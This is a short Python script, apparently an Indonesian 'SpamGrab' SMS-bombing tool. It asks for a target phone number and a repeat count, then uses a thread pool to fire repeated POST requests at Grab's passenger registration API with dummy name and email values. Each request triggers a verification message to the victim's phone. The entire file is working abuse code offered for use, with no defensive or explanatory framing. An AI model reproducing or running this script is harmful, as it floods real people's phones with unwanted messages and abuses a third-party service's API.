#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by KANG-NEWBIE
from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	print(""" 
 _____  _____  _____  __  __  _____  _____  _____  _____ 
/  ___>/  _  \/  _  \/  \/  \/   __\/  _  \/  _  \/  _  \
|___  ||   __/|  _  ||  \/  ||  |_ ||  _  <|  _  ||  _  <
<_____/\__/   \__|__/\__ \__/\_____/\__|\_/\__|__/\_____/
\033[1;93m# \033[1;97mAuthor: \033[1;91mMaestro
\033[1;93m# \033[1;97mType : \033[1;91mSpamGrab
\033[1;93m# \033[1;97mGithub: \033[1;92mhttps://github.com/maestro-a                                                         
""")
	no = input("\033[1;93m[?] \033[1;96mNOMOR (\033[1;91mSesuai Kode Negara) =>\033[1;93m ")
	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] \033[1;96mBERHASIL\033[1;92m[+]")
		else:
			print("\033[1;31m[-] GAGAL")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("SELESAI")
